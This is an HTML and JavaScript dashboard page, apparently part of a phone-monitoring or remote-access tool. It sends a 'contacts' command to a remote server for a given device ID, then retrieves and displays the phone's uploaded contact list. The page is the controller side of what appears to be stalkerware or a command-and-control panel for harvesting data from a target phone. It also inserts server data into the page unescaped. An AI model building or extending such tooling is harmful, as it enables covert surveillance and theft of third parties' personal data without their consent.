<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Server Check</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
            --error: #ff4444;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 450px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px;
            border: 1px solid var(--glass-border);
            min-height: 80vh;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 15px; padding-bottom: 10px;
            border-bottom: 1px solid var(--glass-border);
        }

        /* --- Naya API Status Bar --- */
        #apiStatus {
            background: rgba(255,255,255,0.05);
            font-size: 11px; padding: 8px; border-radius: 10px;
            margin-bottom: 15px; border-left: 3px solid var(--accent);
            word-break: break-all; color: #00ff00;
        }

        .back-btn {
            color: var(--text-main); font-size: 1.2rem;
            text-decoration: none; display: flex; align-items: center; justify-content: center;
            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
        }

        .page-title { font-size: 1.1rem; font-weight: bold; }

        .contact-list {
            display: flex; flex-direction: column; gap: 10px;
            max-height: 550px; overflow-y: auto; padding-right: 5px;
        }

        .contact-card {
            background: var(--glass-bg); padding: 12px;
            border-radius: 15px; display: flex; align-items: center;
            border: 1px solid var(--glass-border);
        }

        .avatar {
            width: 38px; height: 38px;
            background: linear-gradient(45deg, #4caf50, #2e7d32);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-weight: bold; margin-right: 15px; flex-shrink: 0;
        }

        .info { flex: 1; }
        .name { font-size: 0.95rem; font-weight: 500; }
        .number { font-size: 0.8rem; color: var(--text-muted); }

        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
        
        .refresh-btn {
            background: var(--accent); border: none;
            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Device Contacts</span>
            <button onclick="fetchContacts()" class="refresh-btn" id="refreshBtn">Refresh</button>
        </div>

        <div id="apiStatus">System Initializing...</div>

        <div class="contact-list" id="contactsContainer">
            <div class="status-msg">Click Refresh to check server...</div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');
        const storageKey = `contacts_${DEVICE_ID}`;
        const statusEl = document.getElementById("apiStatus");

        function setStatus(msg, color = "#00ff00") {
            statusEl.style.color = color;
            statusEl.style.borderLeftColor = color;
            statusEl.innerHTML = `<strong>ðŸ“¡ Status:</strong> ${msg}`;
        }

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                setStatus("ERROR: Device ID missing in URL!", "#ff4444");
                return;
            }
            
            setStatus(`Ready. Device ID: ${DEVICE_ID}`);
            loadFromStorage();
            sendCommand();
            setTimeout(fetchContacts, 3000); 
        });

        function loadFromStorage() {
            const savedData = localStorage.getItem(storageKey);
            if (savedData) {
                setStatus("Showing data from LocalStorage. Fetching updates...");
                renderContacts(JSON.parse(savedData));
            }
        }

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
            }).then(() => logAppend("Command sent to phone."));
        }

        function fetchContacts() {
            const btn = document.getElementById("refreshBtn");
            const container = document.getElementById("contactsContainer");
            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
            
            const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`;
            setStatus(`Fetching: ${apiURL}`);

            fetch(apiURL)
                .then(res => {
                    if (!res.ok) throw new Error(`HTTP Error ${res.status}`);
                    return res.text(); // Pehle text lete hain taaki [] check kar sakein
                })
                .then(rawText => {
                    console.log("Raw Server Data:", rawText);
                    
                    if (rawText.trim() === "[]" || rawText.trim() === "") {
                        setStatus("SERVER RESPONSE: [] (Data khali hai, phone ne abhi bheja nahi)", "#ff9800");
                        if(!localStorage.getItem(storageKey)) {
                           container.innerHTML = `<div class="status-msg">Server replied with [ ].<br>Phone has not uploaded contacts yet.</div>`;
                        }
                        return;
                    }

                    try {
                        const data = JSON.parse(rawText);
                        if (data && data.length > 0) {
                            localStorage.setItem(storageKey, JSON.stringify(data));
                            setStatus(`SUCCESS: Received ${data.length} contacts.`);
                            renderContacts(data);
                        }
                    } catch (e) {
                        setStatus("JSON ERROR: Server sent invalid format", "#ff4444");
                    }
                })
                .catch(err => {
                    setStatus(`CONNECTION ERROR: ${err.message}`, "#ff4444");
                })
                .finally(() => {
                    btn.innerHTML = 'Refresh';
                });
        }

        function renderContacts(data) {
            const container = document.getElementById("contactsContainer");
            container.innerHTML = "";
            data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
            data.forEach(contact => {
                const name = contact.name || "Unknown";
                const num = contact.number || contact.phone || "No Number";
                container.innerHTML += `
                    <div class="contact-card">
                        <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                        <div class="info">
                            <div class="name">${name}</div>
                            <div class="number">${num}</div>
                        </div>
                    </div>`;
            });
        }

        function logAppend(msg) {
            console.log(msg);
        }
    </script>
</body>
</html>
